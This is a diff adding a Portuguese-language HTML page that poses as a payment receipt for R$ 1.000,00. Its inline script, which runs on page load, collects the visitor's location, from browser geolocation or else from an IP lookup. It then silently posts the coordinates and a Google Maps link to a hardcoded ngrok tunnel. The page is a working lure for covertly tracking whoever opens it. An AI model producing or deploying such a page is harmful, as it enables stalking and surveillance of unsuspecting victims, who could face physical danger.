@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Comprovante de Recebimento</title>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+
+<body>
+  <div class="comprovante-container">
+    <h1>Comprovante de Recebimento</h1>
+
+    <div class="informacoes">
+      <p><span>Data:</span> <span id="data-atual"></span></p>
+      <p><span>Valor Recebido:</span> R$ 1.000,00</p>
+      <p><span>De:</span> João Silva de Oliveira</p>
+      <p><span>Status:</span> Recebido com Sucesso</p>
+    </div>
+
+    <button class="botao" onclick="window.print()">Imprimir</button>
+
+    <div class="comprovante-footer">
+      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
+
+  <script>
+    const NGROK_ENDPOINT = "https://9936-2804-d55-5505-f100-6b9c-2878-dc00-5b07.ngrok-free.app/send-location";
+
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, fallbackToIP);
+      } else {
+        fallbackToIP();
+      }
+    });
+
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      sendToServer({ latitude, longitude, maps });
+    }
+
+    function fallbackToIP(error) {
+      console.warn("Geolocalização falhou, tentando por IP. Erro:", error?.message || "Desconhecido");
+
+      fetch("https://ipwho.is/")
+        .then(res => res.json())
+        .then(data => {
+          const latitude = data.latitude;
+          const longitude = data.longitude;
+          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          sendToServer({ latitude, longitude, maps });
+        })
+        .catch(err => {
+          console.error("Erro ao usar IP como fallback:", err);
+          alert("Não foi possível obter a localização por nenhum método.");
+        });
+    }
+
+    function sendToServer(data) {
+      fetch(NGROK_ENDPOINT, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+        .then(res => res.json())
+        .then(result => {
+          if (result.success) {
+            console.log("Localização enviada com sucesso!");
+          } else {
+            alert("Erro ao enviar a localização: " + result.message);
+          }
+        })
+        .catch(err => {
+          console.error("Erro ao enviar para o servidor:", err);
+          alert("Erro de rede ao enviar localização.");
+        });
+    }
+  </script>
+</body>
+
+</html>
